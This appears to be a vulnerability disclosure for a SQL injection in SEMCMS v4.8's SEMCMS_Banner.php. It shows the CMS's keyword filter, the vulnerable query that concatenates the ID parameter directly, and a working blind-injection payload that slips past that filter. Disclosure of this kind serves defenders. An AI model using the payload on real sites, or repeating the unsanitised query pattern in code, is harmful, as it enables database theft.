#  Semcms v4.8 SEMCMS_Banner.php SQL Injection

###  Introduction to Semcms

SEMCMS is a foreign trade website content management system (CMS) that supports multiple languages.

```
v4.8zip download link:http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip
```

###  Vulnerability description

A SQL injection vulnerability exists in the SEMCMS v4.8 backend. The vulnerability results from a lack of validation of externally entered SQL statements in the SEMCMS_Banner.php parameters ID and lgid. An attacker without an account could exploit this vulnerability to execute illegal SQL commands to obtain sensitive data from the database.

###  Vulnerability analysis

filter function：

```php
function inject_check_sql($sql_str) {

     return preg_match('/select|and|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str); 
} 
function verify_str($str) { 
       if(inject_check_sql($str)) {
           exit('Sorry,You do this is wrong! (.-.)');
        } 
    return $str;
} 

```

The vulnerability exists on line 32 of SEMCMS_Banner.php:

![image-20240325125850992](https://github.com/ss122-0ss/semcms/assets/131983607/6827dde3-32ea-4718-a64d-af68ab781cd3)


```php
<?php
}elseif($type=="edit"){
    
 $row = mysqli_fetch_array($db_conn->query("SELECT * FROM sc_banner WHERE ID=".$_GET["ID"]));
 
?>
```



The vulnerability exists on line 69 of SEMCMS_Banner.php:

![image-20240325130124241](https://github.com/ss122-0ss/semcms/assets/131983607/3c28e528-52b9-4769-992a-ae5375649f22)


```
payload:-1 or ascii(substr(database(),1,1)) REGEXP char(94,49,48,57,36)
```

When the condition is true:

It should be noted that you need to add pictures before reproducing, otherwise no picture will be generated on the page no matter what the ID and lgid are equal to.

![image-20240325130216303](https://github.com/ss122-0ss/semcms/assets/131983607/316e01c6-f446-409f-be11-3232188d8885)

![image-20240325130221278](https://github.com/ss122-0ss/semcms/assets/131983607/7761917f-e8e2-4269-b383-d8f4e92cdff2)

![image-20240325130707386](https://github.com/ss122-0ss/semcms/assets/131983607/17aff268-9248-451f-b996-41386d8fbc54)

![image-20240325130725854](https://github.com/ss122-0ss/semcms/assets/131983607/424699af-1352-483e-b36d-01e07843c169)
